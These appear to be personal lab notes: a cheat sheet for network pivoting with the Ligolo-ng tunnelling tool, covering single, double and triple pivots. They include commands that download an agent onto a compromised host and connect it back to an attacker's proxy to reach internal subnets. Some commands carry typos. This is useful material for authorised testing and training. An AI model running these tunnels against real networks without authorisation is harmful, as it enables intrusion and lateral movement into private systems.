
##  Ligolo-ng Pivoting Cheat Sheet

## 🔧 Install on Parrot OS (Proxy/Relay Server)

Parrot OS is Debian-based, so you can grab the latest precompiled binaries directly from GitHub. 
```bash
# Create a working directory
mkdir ~/ligolo-ng && cd ~/ligolo-ng

# Download the Linux proxy (your Parrot box)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz

# Download the Linux agent (for deploying to other Linux hosts)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz

# Download the Windows agent (amd64)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip

# Download the Windows agent (arm64, optional)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_arm64.zip

# Extract everything
tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
unzip ligolo-ng_agent_0.8.2_windows_amd64.zip

# Make binaries executable
chmod +x proxy agent
```

---

## 🌐 Set Up the TUN Interface (run once per session)

bash

```bash
# Create the ligolo TUN interface (requires root)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# Verify it's up
ip addr show ligolo
```

---

## 🚀 Start the Proxy on Parrot

bash

```bash
# Start with a self-signed cert on default port 11601
sudo ./proxy -selfcert

# Or bind to a specific interface/port
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```
### Phase 2: Delivery (Transfer to Target)

Transfer the agent from your Parrot machine to the compromised host (DMZ01).

Bash

```
wget http://10.10.15.254:8123/agent
```


---

### Phase 3: Establishing the Tunnel

**1. Start the Proxy (On Parrot):**

Bash

```
sudo ./ligolo-proxy -selfcert
```

**2. Connect the Agent (On Target):**

Bash

```
./agent -connect 10.10.15.65:11601 -ignore-cert
```

**3. Activate the Session (Inside Ligolo-Proxy Terminal):**

- Type `session`, then select your active agent (e.g., `1`).
    
- Type `start` to begin the relay.
    

---

### Phase 4: Routing & Access

Now you must tell your local OS to send internal traffic into the tunnel.

Bash

```
# Inside ligolo interface
autoroute

#Then select the interface ligolo that we created earlier.
```

**Verify the Connection:**

Bash

```
# Test the tunnel with a no-ping scan
nmap -Pn -p 22 172.16.119.10
```

```
C:\Users\mlefay\AppData\Local\Temp\agent.exe -connect 172.16.5.35:11601 -ignore-cert
```


# Multiple Pivoting using Ligolo-NG

- For each network that we're gonna discover, we'll create a new network interface on our attack box

#### Creating the network interface

```python
sudo ip tuntap add user htb-ac-2081772 mode tun ligolo
sudo ip link set ligolo up
```

#### Start the ligolo-ng proxy
```python
sudo proxy -selfcert
```

#### Transfer the ligolo agent to the target host
- we can do that using any method.
```python
#on the target host
chmod +x agent
./agent -connect <ip-address-of-attack-host>:11601 -ignore cert
```

- This connects the agent to the server.
![[Pasted image 20260328102346.png]]
```python
#Inside ligolo interface
session
#select the session
start --tun ligolo
```

##### On a new terminal
```python
#Add the route
sudo ip route addd 172.16.5.0/24 dev ligolo
```

###### That's it!, now we'll be able to access hosts on that network range.

### Pivoting to the second host
- lets say we pivoted in to the new machine and we can see a new separate network interface on the new host which connects to a different network range that we didn't previously have access to.
#### Setting up the new network interface

```python
#On the attack host
sudo ip tuntap add user htb-ac-2081772 mode tun ligolo-double
sudo ip link set ligolo-double up
```
#### Go back to the ligolo proxy interface
- make sure that we are in the session of our initial pivot host
- then
```python
listener_add -addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
#Essentially we're connecting the new jump server to our previous jump server and the first jump server is gonna forward all the traffic to our attack host
```

## Transfer the ligolo agent to the new attack box
- we can do this with any method feasible.
```python
#ligolo agent on the new pivot host
./agent -connect <ip-address-of-the-previous-jump-box>:11601 -ignore cert
```

###### That's it!
- In our ligolo-proxy interface, we can see that a new agent has joined.
![[Pasted image 20260328111256.png]]

```python
#Setting up the route, in a new terminal
sudo ip route add 172.16.6.0/24 dev ligolo-double
```

```python
#Back in our ligolo proxy
start -tun ligolo-double
```

## Moving to the third host (just do the same process)
### Create a new network interface ligolo-triple

```python
sudo ip tuntap add user kali mode tun ligolo-triple
sudo ip link set ligolo-triple up
```

### Back in our ligolo proxy interface
- make sure that we are in the session of the second jump box.
```
listener_add -adddr 0.0.0.0:11601 --to 127.0.0.1:11601 -tcp
```
- we can do `listener_list` to confirm
![[Pasted image 20260328112110.png]]
### Transfer the ligolo agent to our new (3rd) machine
```python
./agent -connect <ip-of-previous-jump-box>:11601 -ignore cert
```

#### Back  in our ligolo proxy interface
- we can see that a new agent has joined
![[Pasted image 20260328112328.png]]
#### Let's add the new network to our ligolo-triple interface

```python
sudo ip route add 172.16.10.0/24 dev ligolo-triple
```

#### Switch our session to our third pivot
```python
session
3
```

#### Start the tunnel

```python
start --tun ligolo-triple
```

### And just like that we'll be able to access devices on the new network as well.
